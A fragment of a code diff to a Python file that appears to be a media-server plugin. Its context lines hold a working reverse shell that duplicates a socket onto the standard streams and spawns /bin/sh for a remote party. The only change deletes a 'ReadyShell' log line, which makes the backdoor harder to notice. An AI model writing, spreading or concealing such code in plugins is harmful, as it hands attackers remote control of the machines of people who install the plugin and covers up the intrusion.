@@ -14,7 +14,6 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/sh")
-Log("ReadyShell")
 time.sleep(10000)
 def Start():
     ObjectContainer.art = R(ART)
